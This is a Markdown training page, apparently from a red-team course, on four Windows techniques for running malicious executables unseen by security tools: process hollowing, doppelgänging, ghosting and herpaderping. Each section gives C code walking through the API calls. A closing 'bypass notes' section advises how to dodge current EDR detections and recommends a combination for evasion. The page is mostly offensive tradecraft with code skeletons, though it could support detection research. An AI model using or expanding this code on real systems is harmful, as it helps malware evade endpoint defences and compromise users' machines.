---
layout: training-page
title: "Process Ghosting & Doppelgänging — Red Team Academy"
module: "Evasion"
tags:
  - process-ghosting
  - process-doppelganging
  - herpaderping
  - hollow
  - edr-bypass
page_key: "evasion-process-ghosting"
render_with_liquid: false
---

# Process Ghosting, Doppelgänging & Herpaderping

These techniques abuse Windows process creation mechanisms to execute arbitrary code while EDR/AV sees either a legitimate-looking process or no file on disk. Process Hollowing replaces a process's memory; Process Doppelgänging uses TxF (transactional NTFS) to create a process from a modified file that's never committed to disk; Process Ghosting creates a process from a file that's been deleted before the image is mapped; Process Herpaderping writes over the file after mapping.

## Process Hollowing

```
// Classic technique — still useful, widely known
// 1. Create target process suspended (e.g., svchost.exe)
// 2. Unmap its memory (NtUnmapViewOfSection)
// 3. Write shellcode/PE to the now-empty process
// 4. Fix headers and relocations
// 5. Set thread context to new entry point
// 6. Resume thread

#include <windows.h>

STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;

// Create suspended:
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL,
    FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// NtUnmapViewOfSection — unmap original image:
pNtUnmapViewOfSection(pi.hProcess, imageBase);

// VirtualAllocEx — allocate space at original ImageBase:
PVOID newBase = VirtualAllocEx(pi.hProcess, imageBase, imageSize,
    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// WriteProcessMemory — write PE headers and sections:
WriteProcessMemory(pi.hProcess, newBase, pHeaders, headerSize, NULL);
// ... write each section ...

// SetThreadContext — update RIP to new entry point:
ctx.Rcx = (DWORD64)newBase + entryPointRVA;
SetThreadContext(pi.hThread, &ctx);

// Resume:
ResumeThread(pi.hThread);
```

## Process Doppelgänging (TxF)

```
// Process Doppelgänging (Tal Liberman, 2017)
// Uses Transactional NTFS (TxF) — write to a file inside a transaction,
// create process from it, then rollback transaction
// → process runs from file that never existed on disk

// Steps:
// 1. NtCreateTransaction — start TxF transaction
HANDLE hTxn;
RtlCreateUserTransaction(&hTxn);

// 2. CreateFileTransacted — open/create file inside transaction:
HANDLE hFile = CreateFileTransactedA(
    "C:\\Windows\\Temp\\legit.exe",  // path (doesn't need to exist)
    GENERIC_WRITE | GENERIC_READ, 0, NULL,
    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTxn, NULL, NULL);

// 3. WriteFile — write malicious PE to transacted file:
WriteFile(hFile, pMaliciousPE, peSize, &bytesWritten, NULL);

// 4. NtCreateSection — create section from transacted file:
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
    PAGE_READONLY, SEC_IMAGE, hFile);

// 5. NtRollbackTransaction — rollback so file never hits disk:
NtRollbackTransaction(hTxn, TRUE);

// 6. NtCreateProcessEx — create process from section:
HANDLE hProcess;
NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
    GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, 0);

// 7. NtCreateThreadEx — start the process:
// ... set up process parameters, create thread at entry point ...
```

## Process Ghosting

```
// Process Ghosting (Gabriel Landau, 2021)
// Creates a section from a file, deletes the file,
// then creates a process from the orphaned section
// → process image file doesn't exist on disk → AV/EDR can't scan it

// Steps:
// 1. Create file with DELETE_ON_CLOSE flag:
HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\ghost.exe",
    GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);

// 2. Write malicious PE:
WriteFile(hFile, pMaliciousPE, peSize, &bytes, NULL);

// 3. Set file to pending delete (before creating section):
FILE_DISPOSITION_INFO dispInfo = { TRUE };
SetFileInformationByHandle(hFile, FileDispositionInfo, &dispInfo, sizeof(dispInfo));

// 4. NtCreateSection — create image section (file still exists at this point):
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
    PAGE_READONLY, SEC_IMAGE, hFile);

// 5. Close file handle → file is deleted (pending delete fires):
CloseHandle(hFile);
// Now the file is gone from disk, but section handle is valid

// 6. NtCreateProcessEx from section:
HANDLE hProcess;
NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
    GetCurrentProcess(), 0, hSection, NULL, NULL, 0);

// 7. Create thread at entry point, run process

// PoC: https://github.com/hasherezade/process_ghosting
```

## Process Herpaderping

```
// Process Herpaderping (Johnny Shaw, 2020)
// Creates process from malicious PE, then overwrites the file with benign content
// → EDR scanning file after process creation sees legitimate file

// Steps:
// 1. Write malicious PE to disk:
HANDLE hFile = CreateFileA("C:\\Windows\\Temp\\benign.exe", ...);
WriteFile(hFile, pMaliciousPE, peSize, ...);

// 2. Create section from malicious PE (while it's on disk):
HANDLE hSection;
NtCreateSection(&hSection, ..., SEC_IMAGE, hFile);

// 3. NtCreateProcessEx from section:
HANDLE hProcess;
NtCreateProcessEx(&hProcess, ..., hSection, ...);

// 4. Overwrite file on disk with benign content:
SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
WriteFile(hFile, pBenignPE, benignSize, ...);
FlushFileBuffers(hFile);

// 5. Create thread → process runs
// → If EDR scans file now, it sees the benign PE

// PoC: https://github.com/jxy-s/herpaderping
```

## Detection & Bypass Notes

```
// Modern EDR detections:

// Process Hollowing:
// - NtUnmapViewOfSection on own process → flag
// - Section created as RWX → flag
// - Fix: use separate sections per type, map RX after writing

// Process Doppelgänging:
// - TxF (transactional NTFS) usage is rare → monitored by EDRs
// - Windows 10 1809+ has improved TxF monitoring
// - Still effective on older enterprise Windows

// Process Ghosting:
// - ETW kernel events: PsCreateProcessNotify fires but image path missing
// - EDR sees process with no file path → suspicious
// - Combine with parent PID spoofing for better cover

// Process Herpaderping:
// - File hash mismatch between section image and file on disk
// - Some EDRs hash-scan at section creation, not file read

// Best combination for 2024:
// Ghosting + indirect syscalls + parent PID spoofing + DLL unhooking
```

## Resources

- Process Ghosting PoC — `github.com/hasherezade/process_ghosting`
- Process Herpaderping — `github.com/jxy-s/herpaderping`
- Process Doppelgänging — Black Hat 2017 paper (Tal Liberman)
- ired.team — process injection techniques reference
- Maldev Academy — full process hollowing/ghosting course
- hasherezade — process injection techniques blog
